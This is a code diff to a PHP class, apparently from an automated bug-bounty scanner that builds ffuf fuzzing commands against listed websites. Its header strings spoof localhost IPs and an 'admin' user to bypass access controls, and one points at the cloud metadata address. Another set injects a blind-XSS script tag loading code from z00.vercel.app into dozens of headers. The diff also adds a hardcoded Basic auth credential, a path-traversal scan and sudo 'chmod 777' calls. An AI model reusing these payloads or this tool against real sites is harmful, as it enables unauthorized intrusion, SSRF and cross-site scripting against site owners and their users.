@@ -22,7 +22,7 @@ class Dirscan extends ActiveRecord
         foreach ($urls as $url){
 
             //inside foreach because there are issues with preg_match and adding new headers + using local ones
-            $headers = " -H 'Accept-Language: en-US;q=0.8,en;q=0.5' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36' -H 'X-Originating-IP: 127.0.0.1' -H 'X-Forwarded-For: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Remote-IP: 127.0.0.1' -H 'X-Remote-Addr: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1' -H 'x-real-ip: 127.0.0.1' -H 'X-Forwarded-Host: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'Client-IP: 127.0.0.1' -H 'Forwarded-For-Ip: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'Forwarded-For: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'Forwarded: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Forwarded-For-Original: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Forwarded-By: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Forwarded: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Custom-IP-Authorization: 127.0.0.1' -H 'X-Client-IP: 127.0.0.1' -H 'X-Host: 127.0.0.1' -H 'X-Forwared-Host: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'True-Client-IP: 127.0.0.1' -H 'X-Cluster-Client-IP: 127.0.0.1' -H 'Fastly-Client-IP: 127.0.0.1' -H 'X-debug: 1' -H 'debug: 1' -H 'CACHE_INFO: 127.0.0.1' -H 'CLIENT_IP: 127.0.0.1' -H 'COMING_FROM: 127.0.0.1' -H 'CONNECT_VIA_IP: 127.0.0.1' -H 'FORWARDED: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'HTTP-CLIENT-IP: 127.0.0.1' -H 'HTTP-FORWARDED-FOR-IP: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'HTTP-PC-REMOTE-ADDR: 127.0.0.1' -H 'HTTP-PROXY-CONNECTION: 127.0.0.1' -H 'HTTP-VIA: 127.0.0.1' -H 'HTTP-X-FORWARDED-FOR-IP: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'HTTP-X-IMFORWARDS: 127.0.0.1' -H 'HTTP-XROXY-CONNECTION: 127.0.0.1' -H 'PC_REMOTE_ADDR: 127.0.0.1' -H 'PRAGMA: 127.0.0.1' -H 'PROXY: 127.0.0.1' -H 'PROXY_AUTHORIZATION: 127.0.0.1' -H 'PROXY_CONNECTION: 127.0.0.1' -H 'REMOTE_ADDR: 127.0.0.1' -H 'VIA: 127.0.0.1' -H 'X_COMING_FROM: 127.0.0.1' -H 'X_DELEGATE_REMOTE_HOST: 127.0.0.1' -H 'X_FORWARDED: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X_FORWARDED_FOR_IP: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X_IMFORWARDS: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X_LOOKING: 127.0.0.1' -H 'XONNECTION: 127.0.0.1' -H 'XPROXY: 127.0.0.1' -H 'l5d-dtab: /$/inet/169.254.169.254/80' -H 'XROXY_CONNECTION: 127.0.0.1' -H 'X-Custom-IP-Authorization: 127.0.0.1' -H 'HTTP_X_REAL_IP: 127.0.0.1' -H 'X-Source: 127.0.0.1' -H 'HTTP_X_FORWARDED_FOR: 127.0.0.1' -H 'X-Forwarded-User: admin' -H 'x-balancer-ip: 127.0.0.1' -H 'Proxy: 127.0.0.1' -H 'x-forwarded-for-y: 127.0.0.1' -H 'x-yandex-internal-request: 1' -H 'X-Bug-Bounty: 5d192f443f79484ce37f8a2f850308fe661f9ea17a56bd44cc9ce2e3b6002d8e' -H 'x-q-domid: 15877' -H 'X-Bug-Bounty1: wellenc_lex' -H 'X-Bug-Bounty2: 41b2aab3-ebbb-4b16-8619-13254a52790e' -H 'X-Bug-Bounty3: 43e81f81-46ef-49ef-a299-1b7018910b78' "; //-H 'Connection: close' -H 'X-BugBounty-Hackerone: wellenc_lex' 
+            $headers = " -H 'Accept-Language: en-US;q=0.8,en;q=0.5' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36' -H 'X-Originating-IP: 127.0.0.1' -H 'X-Forwarded-For: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Remote-IP: 127.0.0.1' -H 'X-Remote-Addr: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1' -H 'X-Forwarded-Host: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'Client-IP: 127.0.0.1' -H 'Forwarded-For-Ip: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'Forwarded-For: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'Forwarded: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Forwarded-For-Original: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Forwarded-By: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Forwarded: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Custom-IP-Authorization: 127.0.0.1' -H 'X-Client-IP: 127.0.0.1' -H 'X-Host: 127.0.0.1' -H 'X-Forwared-Host: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'True-Client-IP: 127.0.0.1' -H 'X-Cluster-Client-IP: 127.0.0.1' -H 'Fastly-Client-IP: 127.0.0.1' -H 'X-debug: 1' -H 'debug: 1' -H 'CACHE_INFO: 127.0.0.1' -H 'CLIENT_IP: 127.0.0.1' -H 'COMING_FROM: 127.0.0.1' -H 'CONNECT_VIA_IP: 127.0.0.1' -H 'FORWARDED: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'HTTP-CLIENT-IP: 127.0.0.1' -H 'HTTP-FORWARDED-FOR-IP: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'HTTP-PC-REMOTE-ADDR: 127.0.0.1' -H 'HTTP-PROXY-CONNECTION: 127.0.0.1' -H 'HTTP-VIA: 127.0.0.1' -H 'HTTP-X-FORWARDED-FOR-IP: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'HTTP-X-IMFORWARDS: 127.0.0.1' -H 'HTTP-XROXY-CONNECTION: 127.0.0.1' -H 'PC_REMOTE_ADDR: 127.0.0.1' -H 'PRAGMA: 127.0.0.1' -H 'PROXY: 127.0.0.1' -H 'PROXY_AUTHORIZATION: 127.0.0.1' -H 'PROXY_CONNECTION: 127.0.0.1' -H 'REMOTE_ADDR: 127.0.0.1' -H 'VIA: 127.0.0.1' -H 'X_COMING_FROM: 127.0.0.1' -H 'X_DELEGATE_REMOTE_HOST: 127.0.0.1' -H 'X_FORWARDED: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X_FORWARDED_FOR_IP: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X_IMFORWARDS: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X_LOOKING: 127.0.0.1' -H 'XONNECTION: 127.0.0.1' -H 'XPROXY: 127.0.0.1' -H 'l5d-dtab: /$/inet/169.254.169.254/80' -H 'XROXY_CONNECTION: 127.0.0.1' -H 'X-Custom-IP-Authorization: 127.0.0.1' -H 'HTTP_X_REAL_IP: 127.0.0.1' -H 'X-Source: 127.0.0.1' -H 'HTTP_X_FORWARDED_FOR: 127.0.0.1' -H 'X-Forwarded-User: admin' -H 'x-balancer-ip: 127.0.0.1' -H 'Proxy: 127.0.0.1' -H 'x-forwarded-for-y: 127.0.0.1' -H 'x-yandex-internal-request: 1' -H 'X-Bug-Bounty: 5d192f443f79484ce37f8a2f850308fe661f9ea17a56bd44cc9ce2e3b6002d8e' -H 'x-q-domid: 15877' -H 'X-Bug-Bounty1: wellenc_lex' -H 'X-Bug-Bounty2: 41b2aab3-ebbb-4b16-8619-13254a52790e' -H 'X-Bug-Bounty3: 43e81f81-46ef-49ef-a299-1b7018910b78' "; //-H 'Connection: close' -H 'X-BugBounty-Hackerone: wellenc_lex' 
 
             $xssheaders = " -H 'Accept-Language: en-US;q=0.8,en;q=0.5' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Originating-IP: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Forwarded-For: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Remote-IP: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Remote-Addr: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Real-IP: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Forwarded-Host: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'Client-IP: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'Forwarded-For-Ip: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'Forwarded-For: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'Forwarded: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Forwarded-For-Original: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Forwarded-By: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Forwarded: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Custom-IP-Authorization: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Client-IP: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Host: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Forwared-Host: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'True-Client-IP: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Cluster-Client-IP: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'Fastly-Client-IP: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-debug: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'debug: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'CACHE_INFO: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'CLIENT_IP: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'COMING_FROM: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'CONNECT_VIA_IP: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'FORWARDED: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'HTTP-CLIENT-IP: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'HTTP-FORWARDED-FOR-IP: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'HTTP-PC-REMOTE-ADDR: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'HTTP-PROXY-CONNECTION: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'HTTP-VIA: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'HTTP-X-FORWARDED-FOR-IP: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'HTTP-X-IMFORWARDS: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'HTTP-XROXY-CONNECTION: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'PC_REMOTE_ADDR: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'PRAGMA: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'PROXY: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'PROXY_AUTHORIZATION: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'PROXY_CONNECTION: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'REMOTE_ADDR: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'VIA: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X_COMING_FROM: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X_DELEGATE_REMOTE_HOST: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X_FORWARDED: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X_FORWARDED_FOR_IP: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X_IMFORWARDS: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X_LOOKING: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'XONNECTION: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'XPROXY: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'XROXY_CONNECTION: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Custom-IP-Authorization: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'HTTP_X_REAL_IP: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Source: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'HTTP_X_FORWARDED_FOR: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Forwarded-User: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'x-balancer-ip: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'x-forwarded-for-y: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'x-yandex-internal-request: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' ";
 
@@ -42,9 +42,18 @@ class Dirscan extends ActiveRecord
                 $headers = $headers." -H 'Authorization: Basic dGVzdDpza2lsbGJveHRlc3Rpbmc=' ";
             }
 
+            if (preg_match("/sbmt|market|instamart/i", $currenturl) === 1) {
+                $headers = $headers." -H 'Authorization: Basic YWRtaW46dGVzdDU1NQ==' ";
+            }
+
             if (preg_match("/.*filed.*.my.mail.ru/i", $currenturl) === 1) {
                 dirscan::queuedone($queueid);
                 continue; //scanning cdn is pointless
+            }
+
+            if (preg_match("/.*skillbox.ru/i", $currenturl) === 1) {
+                dirscan::queuedone($queueid);
+                continue; //scanning skb is pointless - tilda
             }
 
             if (preg_match("/.*cs.*.vk.me/i", $currenturl) === 1) {
@@ -107,7 +116,7 @@ class Dirscan extends ActiveRecord
 
             if ( ($firstpartofsubdomain == $hostonly) || ($firstpartofsubdomain == $domainfull) || ($firstpartofsubdomain == $hostname) ) $firstpartofsubdomain = ""; //remove duplicate extension from scan
 
-            $extensions = "_,0,~,~1,1,2,inc,ini,log,php,asp,aspx,jsp,py,txt,tmp,conf,config,bak,backup,old,db,sql,com,com.zip,bz2,zip,tar,rar,tgz,js,json,tar.gz,yml,php~";
+            $extensions = "_,0,~,~1,1,2,inc,ini,log,php,asp,aspx,jsp,py,txt,tmp,conf,config,bak,backup,old,db,sql,com,com.zip,bz2,zip,tar,rar,tgz,js,json,tar.gz,php~";
 
             if ( $hostname != "" ) $extensions = $extensions . "," . $hostname; if ( $domainfull != "" )           $extensions = $extensions . "," . $domainfull;
             if ( $hostonly != "" ) $extensions = $extensions . "," . $hostonly; if ( $firstpartofsubdomain != "" ) $extensions = $extensions . "," . $firstpartofsubdomain;
@@ -121,6 +130,7 @@ class Dirscan extends ActiveRecord
             $outputdir = "/ffuf/" . $randomid . "/" . $counter . "/";
             
             $ffuf_output = $outputdir ."out.json";
+            $ffuf_output2 = $outputdir ."out2.json";
             $ffuf_output_localhost = $ffuf_output . ".localhost.json";
             $ffuf_output_wordlist = $ffuf_output . ".wordlist";
             $ffuf_output_custom = $ffuf_output . ".custom";
@@ -129,7 +139,7 @@ class Dirscan extends ActiveRecord
             exec("sudo mkdir " . $outputdir . " "); //create dir for ffuf scan results
             exec("sudo chmod -R 777 /ffuf/" . $randomid . "/");
             
-            $ffuf_string = "sleep 3 && /go/ffuf/ffuf -maxtime 2999000 -mc all -fc 504,501,404,403,429,503,502,406,520,522 -fs 612,613,548,26,25,0,696956 -s -timeout 150 -t 2 -rate 1 -p 2 -fr 'Selligent Marketing Cloud|Incapusla Incident|shopify|okta|medium.com|Vercel|Too Many Requests|blocked by|Blocked by|Please wait while|Thank you for using nginx|Welcome to nginx|Scan your infrastructure with us|Ubuntu Default Page|It works!|Welcome to CentOS|cloudflareaccess.com|rs_weight=1|This page is used to test the proper operation of the|This directory contains your static files|The requested URL was rejected|HTTP Error: 414|Cloudflare is currently unable to resolve your|400 Bad Request' -r -ac -noninteractive ";
+            $ffuf_string = "sleep 3 && /go/ffuf/ffuf -maxtime 2999000 -mc all -fc 504,501,404,403,429,503,502,406,520,522 -fs 612,613,548,26,25,0,696956 -s -timeout 150 -t 1 -rate 2 -p 0.5 -fr 'Selligent Marketing Cloud|Incapusla Incident|shopify|okta|medium.com|Vercel|Too Many Requests|blocked by|Blocked by|Please wait while|Thank you for using nginx|Welcome to nginx|Scan your infrastructure with us|Ubuntu Default Page|It works!|Welcome to CentOS|cloudflareaccess.com|rs_weight=1|This page is used to test the proper operation of the|This directory contains your static files|The requested URL was rejected|HTTP Error: 414|Cloudflare is currently unable to resolve your|400 Bad Request' -r -ac -noninteractive ";
             
             
             $general_ffuf_string = $ffuf_string.$headers." -w /configs/dict.txt:FUZZ -D -e " . escapeshellarg($extensions) . " -od " . $outputdir . " -of json ";
@@ -138,6 +148,8 @@ class Dirscan extends ActiveRecord
             
             if ( $ip == 0) { //IF no specific IP set for URL
                 $start_dirscan = $general_ffuf_string . " -u " . escapeshellarg($currenturl."/FUZZ") . " -o " . $ffuf_output . " ";
+
+                $start_dirscan2 = $general_ffuf_string . " -u " . escapeshellarg($currenturl."/../FUZZ") . " -o " . $ffuf_output2 . " ";
 
                 $start_dirscan_xss = $ffuf_string.$xssheaders . " -u " . escapeshellarg($currenturl."/") . "  ";
 
@@ -159,6 +171,7 @@ class Dirscan extends ActiveRecord
             }
 
             $executeshell = $executeshell . $start_dirscan . " & ".PHP_EOL;
+            //$executeshell = $executeshell . $start_dirscan2 . " & ".PHP_EOL;
             /*$executeshell = $executeshell . $start_dirscan_xss1 . " & ".PHP_EOL;
             $executeshell = $executeshell . $start_dirscan_xss_headers1 . " & ".PHP_EOL;
             $executeshell = $executeshell . $start_dirscan_xss_headers . " & ".PHP_EOL;
@@ -220,8 +233,8 @@ class Dirscan extends ActiveRecord
             wait; >> /ffuf/" . $randomid . "/0bash.txt && cat /ffuf/" . $randomid . "/*/gau.txt >> /ffuf/gau.txt");
 
         file_put_contents($shellfile, $runffufs);
-//--net=container:vpn". rand(1,3) ."
-        exec("sudo chmod +x " . $shellfile . " && sudo docker run    -v ffuf:/ffuf -v configs:/configs --cpu-shares 128 --rm 5631/ffufs " . $shellfile);
+//--net=container:vpn1
+        exec("sudo chmod +x " . $shellfile . " && sudo docker run --net docker_default -v ffuf:/ffuf -v configs:/configs --cpu-shares 128 --rm 5631/ffufs " . $shellfile);
 
         while($counter!=0){
 
@@ -229,11 +242,13 @@ class Dirscan extends ActiveRecord
 
             $outputdir = "/ffuf/" . $randomid . "/" . $counter . "/";
             $ffuf_output = $outputdir ."out.json";
+            $ffuf_output2 = $outputdir ."out2.json";
             $ffuf_output_localhost = $ffuf_output . ".localhost.json";
             $ffuf_output_wordlist = $ffuf_output . ".wordlist";
             $ffuf_output_custom = $ffuf_output . ".custom";
             
             $output_ffuf[] = dirscan::ReadFFUFResult($ffuf_output, 0, $outputdir);
+            //$output_ffuf[] = dirscan::ReadFFUFResult($ffuf_output2, 0, $outputdir);
             $output_ffuf[] = dirscan::ReadFFUFResult($ffuf_output_localhost, 1, $outputdir);
             $output_ffuf[] = dirscan::ReadFFUFResult($ffuf_output_wordlist, 0, $outputdir);
             $output_ffuf[] = dirscan::ReadFFUFResult($ffuf_output_custom, 0, $outputdir);
